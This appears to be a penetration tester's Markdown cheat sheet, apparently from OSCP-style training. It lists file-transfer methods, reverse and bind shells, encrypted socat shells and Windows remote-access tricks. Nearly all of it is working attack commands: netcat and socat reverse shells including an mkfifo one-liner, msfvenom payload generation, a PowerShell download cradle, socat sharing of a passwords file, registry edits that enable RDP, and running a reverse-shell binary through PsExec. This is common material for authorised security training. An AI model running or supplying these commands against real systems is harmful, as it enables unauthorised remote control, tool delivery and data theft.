## File Transfers
- netcat
	- send wget.exe to a nc listener on port 4444:
	`nc -nv {ip-address} 4444 < /usr/share/windows-resources/binaries/wget.exe`
	- receive a file on port 4444 and name it wget.exe:
	`nc -nlvp 4444 > wget.exe`

- socat
	- Share a file called passwords.txt on port 443:
	`sudo socat TCP4-LISTEN:443,fork file:passwords.txt`
	- Receive a file being hosted on port 443 and save it to passwords.txt:
	`socat TCP4:{ip-address}:443 file:passwords.txt,create`

- powershell 
	- `Set-ExecutionPolicy Unrestricted` must be applied beforehand
	- Download wget.exe from a websever (such as a SimpleHTTPServer) :
	 `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{ip-address}/wget.exe','C:\Users\offsec\Desktop\wget.exe')" `

- SMB
	- set up a SMB server on Kali with a share called Tools in the wd
	`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .`
	- copy a file from Kali to Windows
	`copy \\{ip-address}\tools\file.ext file.ext`
	- copy a file from Windows to Kali
	`copy file.ext \\{ip-address}\tools\file.ext`

## Reverse Shells
Victim connnects and attacker listens. Used 95% of the time.

- netcat
	- attacker runs: `nc -nlvp 4444`
	- victim runs: `nc -nv {ip-address} 4444 -e /bin/bash` 
- socat
	- attacker runs: `sudo socat -d -d  TCP4-LISTEN:4444 STDOUT`
	- victim runs: `socat TCP4:{ip-address}:4444 EXEC:/bin/bash`
- netcat without `-e` or `-c` on victim
	- attacker runs: `nc -nlvp 4444`
	- victim runs: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip-address} 1234 >/tmp/f`
- msfvenom to create reverse shell binaries
	- windows: `msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip-address} LPORT={port} -f exe -o reverse.exe`
	- linux: 
	- attacker can set up a listener with netcat of metasploit's multi/handler

## Bind Shells
Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".

- netcat
	- victim runs: `nc -nlvp 4444 -e cmd.exe`
	- attacker runs: `nc -nv 10.11.0.22 4444`

- socat
	- victim runs: `socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash`
	- attacker runs: `socat - TCP4:{ip-address}:4444`

## Encrypted shells with OpenSSL
Utilize SSL certificates to encrypt data sent between hosts

- create an openssl certificate
	- `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 100 -out bind_shell.crt`
- concatenate the certififcate and private key into a .pem file
	- `cat bind_shell.key bind_shell.crt > bind_shell.pem`
- socat listener utilizing the cert
	- `sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
- socat SSL connection to listener
	- `socat - OPENSSL:{ip-address}:443,verify=0`

## Other Windows Shell-like options
- RDP
	- Create a regfile.reg file with `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalService`
	- `"fDenyTSConnections"=dword:00000000"`
	- `reg import regfile.reg`
	- `net start "termservice"`
	- `sc config termservice start= auto`
	- `net start termservice`

- [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec): a light-weight telnet-replacement that lets you execute processes on other systems
	- `.\PsExec64.exe -accepteula -i -s C:\path\to\reverse.exe` (see msfvenom to create reverse shell binaries)